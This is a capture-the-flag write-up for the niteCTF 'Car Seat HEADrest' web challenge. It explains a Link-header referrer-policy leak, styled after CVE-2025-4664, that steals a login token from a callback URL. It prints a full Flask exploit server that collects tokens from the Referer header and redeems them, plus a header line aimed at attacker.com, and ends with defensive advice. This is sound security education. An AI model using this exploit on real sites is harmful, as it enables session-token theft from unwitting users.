# Car Seat HEADrest (Web Exploitation)

## Challenge Description

> Can you steal the flag?

**Author:** kafka  
**URL:** `https://cars.chals.nitectf25.live/`

## TL;DR

XS-Leak attack exploiting **CVE-2025-4664**-style behavior: a response `Link` header with `referrerpolicy="unsafe-url"` on a preloaded resource overrides the browser's default referrer policy, causing the full URL (including the sensitive `?token=` query parameter at `/auth/callback`) to be sent as a `Referer` header to an attacker-controlled endpoint.

## Background: The Vulnerability Class

**CVE-2025-4664** — Browsers applying a `Link` header's `referrerpolicy` attribute to the _initiating_ page, not just the preloaded resource itself. This allows a response to retroactively downgrade the referrer policy for the page that fetched it, leaking the full URL in a subsequent cross-origin `Referer` header.

Default browser referrer policy (`strict-origin-when-cross-origin`) would normally send only the origin on cross-origin requests, hiding the query string. The `Link` header attack forces `unsafe-url` policy instead, leaking the full URL including `?token=TARGET_TOKEN`.

## Code Analysis

### How the Token Lands in the URL

After login, the bot is redirected to:

```
/auth/callback?token=TARGET_TOKEN
```

This token is never readable by JavaScript — it's only in the URL, and the `httpOnly` flag protects the resulting session cookie.

### The leakUrl Injection Point

The bot accepts a `leakUrl` parameter injected as a hidden form field before login:

```js
// bot.js
if (leakUrl) {
  await page.evaluate((url) => {
    const form = document.querySelector("form");
    const input = document.createElement("input");
    input.type = "hidden";
    input.name = "leakUrl";
    input.value = url;
    form.appendChild(input);
  }, leakUrl);
}
```

After login, the app reflects `leakUrl` into the callback page as an `<img>` tag:

```js
// server.js
const leakImage = leakUrl
  ? `<img src="${leakUrl.replace(/"/g, "&quot;")}" style="display:none">`
  : "";

res.send(`...${leakImage}...`);
```

The double-quote sanitization prevents XSS breakout. However, we control the URL the browser fetches — and we control what _that_ URL responds with.

## Solution

The exploit requires hosting a server with three endpoints:

### Endpoint 1: `/exploit` — The Image URL Submitted to the Bot

This is the `leakUrl` value submitted. The browser at `/auth/callback?token=TOKEN` fetches this as an `<img>`.

### Endpoint 2: `/leak.png` — The Actual Image Response

The browser fetches this image. The response includes a `Link` header declaring a preload with `referrerpolicy="unsafe-url"`:

```
Content-Type: image/png
Link: <https://attacker.com/log>; rel="preload"; as="image"; referrerpolicy="unsafe-url"
```

This overrides the referrer policy for the subsequent preload request.

### Endpoint 3: `/log` — Captures the Full Referer

The browser performs a preload request to `/log`. Because the policy was just set to `unsafe-url`, the `Referer` header now contains the full URL of the initiating page:

```
Referer: https://cars.chals.nitectf25.live/auth/callback?token=TARGET_TOKEN
```

Token extracted. POST it to `/auth/session/validate` to get the flag.

### Exploit Server

```python
from flask import Flask, request, Response
import requests
from urllib.parse import urlparse, parse_qs

app = Flask(__name__)
VICTIM_URL = "https://cars.chals.nitectf25.live"

@app.route('/exploit')
def exploit():
    leak_url = request.url_root.rstrip('/') + '/leak.png'
    html = f'''<!DOCTYPE html><html><body>
    <img src="{leak_url}" style="display:none">
    </body></html>'''
    return Response(html, mimetype='text/html')

@app.route('/leak.png')
def leak():
    # Minimal valid 1x1 PNG
    png = (b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01'
           b'\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\nIDATx\x9cc\xf8\x0f'
           b'\x00\x01\x01\x01\x00\x18\xdd\x03\xdb\x00\x00\x00\x00IEND\xaeB`\x82')
    resp = Response(png, mimetype='image/png')
    log_url = request.url_root.rstrip('/') + '/log'
    # THE KEY: Link header sets unsafe-url referrer policy for the preload
    resp.headers['Link'] = (
        f'<{log_url}>; rel="preload"; as="image"; referrerpolicy="unsafe-url"'
    )
    return resp

@app.route('/log')
def log():
    referrer = request.headers.get('Referer') or request.headers.get('Referrer')
    if referrer and 'token=' in referrer:
        parsed = urlparse(referrer)
        token = parse_qs(parsed.query).get('token', [None])[0]
        if token:
            print(f"[+] Token: {token}")
            r = requests.post(
                f"{VICTIM_URL}/auth/session/validate",
                json={"token": token},
                timeout=5
            )
            if r.status_code == 200:
                print(f"[+] Flag: {r.json().get('flag')}")
    return 'logged', 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```

**Attack flow:**

1. Start exploit server (expose publicly via ngrok)
2. Submit `https://ATTACKER/exploit` as the `leakUrl` to the bot
3. Bot logs in → lands at `/auth/callback?token=TARGET_TOKEN`
4. Browser fetches `<img src="https://ATTACKER/exploit">`
5. `/exploit` returns HTML that loads `/leak.png`
6. `/leak.png` responds with `Link: ...; referrerpolicy="unsafe-url"`
7. Browser preloads `/log` — sends full `Referer` including the token
8. Server validates token → retrieves flag

## Flag

```
nite{ihaventlookedatthesunforsooolooong}
```

## Key Takeaways

- **CVE-2025-4664** — `Link` header `referrerpolicy` attribute in resource responses can override the parent page's effective referrer policy, enabling full-URL leakage cross-origin
- **XS-Leaks** — a class of side-channel attacks that extract cross-origin information using observable browser behaviors (timing, status codes, redirect counts, referrer headers) rather than direct DOM access
- **Tokens in URLs are inherently dangerous** — any URL containing a secret in the query string is vulnerable to leakage via referrer, history, logs, and browser extensions
- **Double-quote sanitization ≠ XSS prevention** — the `"` → `&quot;` replacement stops attribute breakout but still allows full URL control, which is sufficient for this attack class
- **Defense:** Never put secrets in URL query parameters; use `Referrer-Policy: no-referrer` on sensitive pages; validate the `Link` header isn't being forwarded from user-controlled responses

## Tools Used

- Python `flask` — exploit server hosting the three-stage response chain
- `pyngrok` — expose local server publicly for the bot to reach
- Browser DevTools — verify `Referer` header behavior manually
- `requests` — token validation against the challenge endpoint
